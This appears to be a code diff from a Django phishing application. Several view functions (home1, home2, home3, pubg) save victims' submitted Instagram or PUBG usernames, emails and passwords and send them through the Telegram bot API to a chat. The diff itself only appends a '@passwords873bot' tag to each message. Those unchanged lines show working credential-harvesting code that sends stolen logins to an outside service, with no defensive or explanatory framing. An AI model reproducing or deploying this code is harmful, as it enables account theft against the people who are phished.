@@ -15,7 +15,7 @@ def home1(request,id):
         )
         nakturka.save()
 
-        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
+        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                           data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
 
@@ -32,7 +32,7 @@ def home2(request,id):
         )
         nakturka.save()
 
-        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
+        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                           data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
 
@@ -49,7 +49,7 @@ def home3(request,id):
         )
         nakturka.save()
 
-        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
+        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                           data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
 
@@ -76,7 +76,7 @@ def pubg(request,id):
         text = (
             f"👮🏻‍♀️ Pubg account 💋\n\n"
             f"📧 *Email*: ```{email}```\n"
-            f"🔒 *Parol*: ```{password}```\n"
+            f"🔒 *Parol*: ```{password}```\n\n@passwords873bot"
         )
         requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                       data={"chat_id": id, "text": text, "parse_mode": "MarkdownV2"})
